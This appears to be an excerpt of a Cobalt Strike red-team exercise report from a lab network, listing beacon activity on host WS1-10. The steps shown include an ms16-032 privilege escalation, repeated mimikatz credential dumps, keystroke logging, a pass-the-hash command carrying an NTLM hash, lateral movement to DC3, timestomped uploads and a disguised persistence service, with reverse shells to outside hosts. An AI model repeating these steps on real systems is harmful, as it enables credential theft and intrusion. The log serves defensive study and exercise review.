+
+26/04 13:01 Tasked Beacon to run windows/beacon_https/reverse_https(2a07:1182:300:111:250:56ff:fe9e:3eb9:443) via ms16-032 
+
+26/04 13:07 host called home, sent: 135485 bytes 
+
+27/04 05:50 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 05:56 host called home, sent: 435794 bytes 
+
+27/04 06:20 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 06:22 host called home, sent: 435794 bytes 
+
+27/04 06:50 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 06:50 host called home, sent: 435794 bytes 
+
+27/04 07:20 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 07:20 host called home, sent: 435794 bytes 
+
+27/04 07:50 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 07:50 host called home, sent: 435794 bytes 
+
+27/04 08:08 run: ip config 
+
+27/04 08:08 run: ipconfig 
+
+27/04 08:09 host called home, sent: 33 bytes 
+
+27/04 08:15 spawn (x86) windows/beacon_https/reverse_https (39.84.231.142:443) 
+
+27/04 08:16 host called home, sent: 564 bytes 
+
+27/04 08:20 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 08:21 host called home, sent: 435794 bytes 
+
+27/04 08:50 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 08:50 host called home, sent: 435794 bytes 
+
+27/04 09:20 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 09:21 host called home, sent: 435794 bytes 
+
+27/04 09:50 run mimikatz's sekurlsa::logonpasswords command 
+
+Page. 837 
+
+date activity 
+
+27/04 09:52 host called home, sent: 435794 bytes 
+27/04 10:14 spawn (x86) windows/beacon_http/reverse_http (static.bbc.com:80) 
+27/04 10:16 host called home, sent: 536 bytes 
+27/04 10:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 10:20 host called home, sent: 435794 bytes 
+27/04 10:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 10:51 host called home, sent: 435794 bytes 
+27/04 11:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 11:21 host called home, sent: 435794 bytes 
+27/04 11:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 11:50 host called home, sent: 435794 bytes 
+27/04 12:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 12:20 host called home, sent: 435794 bytes 
+27/04 12:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 12:56 host called home, sent: 435794 bytes 
+27/04 13:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 13:24 host called home, sent: 435794 bytes 
+27/04 13:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 13:53 host called home, sent: 435794 bytes 
+
+
+10.7.3.160 (WS1-10) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 9848 
+Opened: 26/04 13:13 
+
+Communication Path 
+
+hosts port protocol 
+www.bong.com, www.bing.com.ex,443 HTTPS 
+bing.bing.com, www.bling.ex, 222.186.31.150,2a07:1182:b00b:babe:250:56ff:fe9e:3eb9 
+
+File Hashes 
+
+date hash name 
+
+27/04 10:32 8b3c4145da2d10516e3ce117ac9be4a1 \\DC3\ADMIN$\85fd06c.exe 
+
+Page. 838 
+
+Other Indicators 
+
+date type target name 
+27/04 10:32 service \\DC3 18bd872 
+27/04 10:34 service \\DC3 197bb43 
+
+Activity 
+
+date activity 
+
+26/04 13:09 host called home, sent: 12 bytes 
+26/04 13:09 steal token from PID 6192 
+26/04 13:09 log keystrokes in 6192 (x64) 
+26/04 13:09 steal token from PID 4608 
+26/04 13:09 log keystrokes in 4608 (x64) 
+26/04 13:10 host called home, sent: 164012 bytes 
+27/04 05:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 05:57 host called home, sent: 435794 bytes 
+27/04 06:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 06:20 host called home, sent: 435794 bytes 
+27/04 06:20 spawn (x86) windows/beacon_https/reverse_https (61.160.210.77:443) 
+27/04 06:23 host called home, sent: 564 bytes 
+27/04 06:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 06:51 host called home, sent: 435794 bytes 
+27/04 07:12 spawn (x86) windows/beacon_https/reverse_https (79.106.16.198:443) 
+27/04 07:12 host called home, sent: 564 bytes 
+27/04 07:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 07:21 host called home, sent: 435794 bytes 
+27/04 07:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 07:50 host called home, sent: 435794 bytes 
+27/04 08:16 spawn (x86) windows/beacon_https/reverse_https (39.84.231.142:443) 
+27/04 08:16 host called home, sent: 564 bytes 
+27/04 08:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 08:20 host called home, sent: 435794 bytes 
+27/04 08:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 08:51 host called home, sent: 435794 bytes 
+27/04 09:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 09:21 host called home, sent: 435794 bytes 
+27/04 09:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 09:52 host called home, sent: 435794 bytes 
+
+Page. 839 
+
+date activity 
+
+27/04 10:15 spawn (x86) windows/beacon_http/reverse_http (static.bbc.com:80) 
+
+27/04 10:17 host called home, sent: 536 bytes 
+
+27/04 10:20 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 10:20 host called home, sent: 435794 bytes 
+
+27/04 10:32 revert token 
+
+27/04 10:32 create a token for LAB\kevin.mitnick 
+
+27/04 10:32 run windows/beacon_smb/bind_pipe (\\DC3\pipe\Winsock\ChangeListener80#) on DC3 via Service Control Manager (\
+\DC3\ADMIN$\85fd06c.exe) 
+
+27/04 10:32 host called home, sent: 220465 bytes 
+
+27/04 10:34 revert token 
+
+27/04 10:34 run mimikatz's sekurlsa::pth /user:kevin.mitnick /domain:LAB /
+ntlm:f9936e4a8fb5945f96b7d2d5541bb167 /run:"cmd.exe /c echo204cbeb5a4c > \\.\pipe\9040d6" command 
+
+27/04 10:34 run windows/beacon_smb/bind_pipe (\\DC3\pipe\Winsock\ChangeListener80#) on DC3 via Service Control Manager (PSH) 
+
+27/04 10:35 host called home, sent: 646547 bytes 
+
+27/04 10:50 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 10:51 host called home, sent: 435794 bytes 
+
+27/04 11:20 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 11:20 host called home, sent: 435794 bytes 
+
+27/04 11:50 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 11:51 host called home, sent: 435794 bytes 
+
+27/04 12:20 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 12:22 host called home, sent: 435794 bytes 
+
+27/04 12:50 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 12:50 host called home, sent: 435794 bytes 
+
+27/04 13:20 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 13:26 host called home, sent: 435794 bytes 
+
+27/04 13:50 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 13:54 host called home, sent: 435794 bytes 
+
+
+10.7.3.160 (WS1-10) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 7128 
+Opened: 27/04 07:12 
+
+Page. 840 
+
+Communication Path 
+
+hosts port protocol 
+79.106.16.198 443 HTTPS 
+
+Activity 
+
+date activity 
+
+27/04 07:18 spawn (x86) windows/beacon_http/reverse_http (apexgames.ex:80) 
+27/04 07:18 host called home, sent: 534 bytes 
+
+
+10.7.3.160 (WS1-10) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 30704 
+Opened: 27/04 07:18 
+
+Communication Path 
+
+hosts port protocol 
+apexgames.ex 80 HTTP 
+
+File Hashes 
+
+date hash name 
+27/04 07:18 1657c55c99cc6bf1dc2cda2fee7a831a linkinfo.dll 
+27/04 07:18 f8daa4673135e9ad39ee7c345284ff50 tdsvc.exe 
+
+Activity 
+
+date activity 
+
+27/04 07:18 cd c:\windows 
+27/04 07:18 upload linkinfo.dll as linkinfo.dll 
+27/04 07:18 timestomp linkinfo.dll to c:\windows\system32\linkinfo.dll 
+27/04 07:18 host called home, sent: 287430 bytes 
+27/04 07:18 cd c:\windows\system32 
+27/04 07:18 upload tdsvc.exe as tdsvc.exe 
+27/04 07:18 timestomp tdsvc.exe to cmd.exe 
+27/04 07:18 run: sc delete tdsvc 
+
+Page. 841 
+
+date activity 
+
+27/04 07:18 run: sc create tdsvc binPath= "C:\windows\system32\tdsvc.exe" start=
+auto DisplayName= "Thin Directory Service" 
+
+27/04 07:18 run: sc description tdsvc "Provides authentication and policymanagement for computers joined to domain." 
+
+27/04 07:18 run: sc start tdsvc 
+
+27/04 07:18 host called home, sent: 310195 bytes 
+
+27/04 07:26 sleep for 180s (30% jitter) 
+
+27/04 07:26 host called home, sent: 16 bytes 
+
+
+10.7.3.160 (WS1-10) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 6484 
+Opened: 27/04 07:29 
+
+Communication Path 
+
+hosts port protocol 
+spamhaus.ex, weather.ex, trace.ex, limonaad.ex, a.ex, b.ex,53, 80 DNS, HTTP 
+jquery.ex, gitlab.ex, purple24.ex 
+
+Activity 
+
+date activity 
+
+27/04 07:18 checkin 
+27/04 07:29 host called home, sent: 8 bytes 
+
+
+10.7.3.160 (WS1-10) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 6444 
+Opened: 27/04 08:16 
+
+Communication Path 
+
+hosts port protocol 
+39.84.231.142 443 HTTPS 
+
+Page. 842 
+
+
+10.7.3.160 (WS1-10) 
+Zone: LAB 
+User: steve.ballmer 
+PID: 30672 
+Opened: 27/04 08:16 
+
+Communication Path 
+
+hosts port protocol 
+39.84.231.142 443 HTTPS 
+
+
+10.7.3.160 (WS1-10) 
+Zone: LAB 
+User: steve.ballmer 
+PID: 30156 
+Opened: 27/04 10:16 
+
+Communication Path 
+
+hosts port protocol 
+static.bbc.com 80 HTTP 
+
+
+10.7.3.160 (WS1-10) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 29792 
+Opened: 27/04 10:17 
+
+Communication Path 
+
+hosts port protocol 
+static.bbc.com 80 HTTP 
+
+Activity 
+
+date activity 
+
+27/04 10:17 host called home, sent: 16 bytes 
+
+Page. 843 
+
+
